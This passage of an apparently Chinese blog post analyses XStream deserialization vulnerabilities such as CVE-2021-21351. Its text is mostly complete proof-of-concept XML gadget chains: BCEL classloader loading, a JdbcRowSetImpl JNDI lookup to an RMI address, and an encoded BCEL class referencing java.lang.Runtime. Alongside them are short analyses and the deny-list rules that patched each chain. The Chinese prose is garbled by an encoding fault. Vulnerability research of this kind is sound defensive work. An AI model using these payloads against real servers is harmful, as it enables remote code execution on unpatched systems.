class="name">assertionLock</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;..&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultAssertionStatus</span>&gt;</span>false<span class="tag">&lt;/<span class="name">defaultAssertionStatus</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>sun.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">repository</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.SyntheticRepository&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">paths</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class__path</span>&gt;</span>.<span class="tag">&lt;/<span class="name">class__path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">__path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">__loadedClasses</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">deferTo</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.Launcher$ExtClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../parent&#x27;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™ä¸ªå’ŒCVE-2021-21347ç±»ä¼¼ï¼Œè¿™æ˜¯æŠŠè¿œç¨‹jaræ”¹ä¸ºäº†BCELæ–¹å¼åŠ è½½ï¼Œç›¸åº”çš„å°†processorCLæ”¹ä¸ºäº†com.sun.org.apache.bcel.internal.util.ClassLoaderã€‚</p><p>åœ¨8u60ç¯å¢ƒä¸‹åŒæ ·é‡åˆ°processorCLæ„é€ çš„é—®é¢˜ï¼Œæ›´æ–°ä¸ºWh1t3p1gå¸ˆå‚…æ„é€ BCELçš„æ–¹å¼ä¹‹åè¿è¡ŒæˆåŠŸã€‚å…·ä½“å¯ä»¥å‚è€ƒLazyIterator ä¸­çš„pocã€‚</p><h3 id="é»‘åå•ï¼š-5"><a href="#é»‘åå•ï¼š-5" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern BCEL_CL = Pattern.compile(<span class="string">&quot;.*\\.bcel\\..*\\.util\\.ClassLoader&quot;</span>);</span><br><span class="line">denyTypeHierarchy(InputStream.class);</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE-2021-21351"></a>CVE-2021-21351</h2><p>author: wh1t3p1g</p><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__size</span>&gt;</span>-10086<span class="tag">&lt;/<span class="name">m__size</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">__overrideDefaultParser</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__overrideDefaultParser</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__incremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__incremental</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__source__location</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__source__location</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__defaultHandler</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__shouldStripWS</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__shouldStripWS</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__indexing</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__indexing</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__incrementalSAXSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fPullParserConfig</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">listeners</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fPullParserConfig</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">name</span>&gt;</span>setAutoCommit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">class</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigParse</span> <span class="attr">reference</span>=<span class="string">&#x27;../fConfigSetInput&#x27;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fParseInProgress</span>&gt;</span>false<span class="tag">&lt;/<span class="name">fParseInProgress</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__incrementalSAXSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__walker</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nextIsRaw</span>&gt;</span>false<span class="tag">&lt;/<span class="name">nextIsRaw</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__walker</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__endDocumentOccured</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__endDocumentOccured</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__idAttributes</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__textPendingStart</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">m__textPendingStart</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__useSourceLocationProperty</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__useSourceLocationProperty</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__pastFirstElement</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__pastFirstElement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">m__dtm</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtmIdentity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmIdentity</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__dtmRoot</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmRoot</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__allowRelease</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__allowRelease</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p><ol><li>ä½ç‰ˆæœ¬çš„jdkä¸­æ²¡æœ‰__overrideDefaultParserï¼Œåœ¨8u121ä¸Šæµ‹è¯•å¤±è´¥ï¼Œ8u172ä¸ŠæˆåŠŸï¼Œ8u251æµ‹è¯•å¤±è´¥ï¼ŒåŸå› æ˜¯é«˜ç‰ˆæœ¬jdk jndiæ³¨å…¥å—JEP290å½±å“ã€‚</li></ol><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™ä¸ªä¹Ÿæ˜¯ysomapä¸­çš„XercesValue payloadã€‚</p><p>è§¦å‘ç‚¹åœ¨IncrementalSAXSource_Xerces.parseSome</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">parseSome</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                <span class="keyword">throws</span> SAXException, IOException, IllegalAccessException,</span></span><br><span class="line"><span class="function">                                         java.lang.reflect.InvocationTargetException</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="comment">// Take next parsing step, return false iff parsing complete:</span></span><br><span class="line">                <span class="keyword">if</span>(fConfigSetInput!=<span class="keyword">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        Object ret=(Boolean)(fConfigParse.invoke(fPullParserConfig,parmsfalse));</span><br></pre></td></tr></table></figure><p>å…¶ä¸­fConfigParseã€fPullParserConfigã€parmsfalseéƒ½å¯æ§</p><h3 id="é»‘åå•ï¼š-6"><a href="#é»‘åå•ï¼š-6" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.sql.rowset.BaseRowSet&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="ServiceFinder-LazyIterator"><a href="#ServiceFinder-LazyIterator" class="headerlink" title="ServiceFinder$LazyIterator"></a>ServiceFinder$LazyIterator</h2><h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">&quot;java.util.ServiceLoader$LazyIterator&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">service</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">loader</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&quot;hashtable&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classes</span> <span class="attr">defined-in</span>=<span class="string">&quot;java.lang.ClassLoader&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&quot;../..&quot;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">domains</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">packages</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">nativeLibraries</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">defaultAssertionStatus</span>&gt;</span>false<span class="tag">&lt;/<span class="name">defaultAssertionStatus</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classes</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">java-class</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">java-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.lang.Runtime<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">java-class</span>&gt;</span>java.lang.Runtime<span class="tag">&lt;/<span class="name">java-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">classes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ignored__packages</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">repository</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.util.SyntheticRepository&quot;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">__path</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">paths</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">class__path</span>&gt;</span><span class="tag">&lt;/<span class="name">class__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">__loadedClasses</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">loader</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">nextName</span>&gt;</span>$$BCEL$$$l$8b$I$A$A$A$A$A$A$Au$90$cdJ$c3$40$U$85$cfm$ab$a91$d5$fe$d8V$c1E$5d$d9$K$fd3$a4$b5T$dc$I$ae$y$8a$V$5dO$c7$a1$a4$c6$q$a4S$f5$8d$5c$bbQq$e1$D$f8P$ea$8d$I$W$c4$Z8$c3$bd$dc$f3$9d$99y$ffx$7d$D$60c$83P$O$ef$fc$fa$ae$d3$ea$ed$f5$da$b6c$b7z$dd$8e$e3t$ba$b6$B$od$t$e2V4$3d$e1$8f$9b$t$a3$89$92$da$40$92$60$O$83Y$q$d5$91$eb$v$c2$e6$3f$feFl$r$y$ee$bb$be$ab$P$I$c9j$ed$c2$82$81$b4$89$U$96$I$a9$c3$e0$8a$ed$b9$df$84$b3$99$af$dd$he$c0$e2$88$b1$d2$3f5$a1X$ad$j$ff$Z$eb$5bX$c1$aa$89$M$b2$84R$Q$w$bfR$X$V$v$3c9$f3$84$O$a2$86$I$c34$f2$i$a4$ee$95$qlW$e7$YC$j$b9$fe$b8$3f$8f$3d$8d$C$a9$a6S$c6$ae$a1$YcK$84$ccP$Ly$3d$Q$e1$b9$Yy$K$5bH$f0$dd$e3E$bc$f9$v$ac$cb$5c$b5$b9$9b$e4$b3$b0$f3$M$f3$81$7fh$f0$82$5c$be$f0$84$f2$e5$e3$f7$f0$3a$ab$F$fad$P$Z$M$89$7b$L$ac$J$y$7e$B$e0$d2$95$ea$8b$B$A$A<span class="tag">&lt;/<span class="name">nextName</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">lock</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span 